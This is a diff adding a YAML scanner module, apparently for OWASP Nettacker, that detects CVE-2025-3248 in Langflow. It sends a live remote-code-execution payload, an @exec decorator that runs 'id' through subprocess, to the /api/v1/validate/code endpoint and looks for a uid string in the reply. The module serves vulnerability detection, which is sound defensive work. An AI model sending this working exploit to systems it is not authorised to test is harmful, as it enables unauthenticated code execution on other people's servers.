@@ -1,0 +1,61 @@
+info:
+  name: langflow_cve_2025_3248_vuln
+  author: jess-tech-lab
+  severity: 9.8
+  description: >
+    Unauthenticated Remote Code Execution (RCE) in Langflow < 1.3.0 via 
+    the /api/v1/validate/code endpoint due to unsafe use of exec(). This module
+    uses a decorator-based execution bypass to trigger code execution
+  references:
+    - https://nvd.nist.gov/vuln/detail/CVE-2025-3248
+    - https://www.cisa.gov/known-exploited-vulnerabilities-catalog
+    - https://github.com/advisories/GHSA-rvqx-wpfh-mfx7
+    - https://www.trendmicro.com/en_us/research/25/f/langflow-vulnerability-flodric-botnet.html
+  profiles:
+    - vuln
+    - http
+    - critical_severity
+    - cve
+    - cve2025
+    - langflow
+    - rce
+
+payloads:
+  - library: http
+    steps:
+      - method: post
+        timeout: 5
+        headers:
+          User-Agent: "{user_agent}"
+          Content-Type: "application/json"
+          Accept: "application/json"
+        allow_redirects: false
+        ssl: false
+        json:
+          code: |
+            @exec("import subprocess; raise Exception(subprocess.check_output(['id']))")
+            def foo(): 
+              pass
+        url:
+          nettacker_fuzzer:
+            input_format: "{{schema}}://{target}:{{ports}}/api/v1/validate/code"
+            prefix: ""
+            suffix: ""
+            interceptors:
+            data:
+              schema:
+                - "http"
+                - "https"
+              ports:
+                - 7860 # Default Langflow port
+                - 80
+                - 443
+        response:
+          condition_type: and
+          conditions:
+            status_code:
+              regex: "200|422|500"
+              reverse: false
+            content:
+              regex: "uid=[0-9]+\\(.*\\)"
+              reverse: false
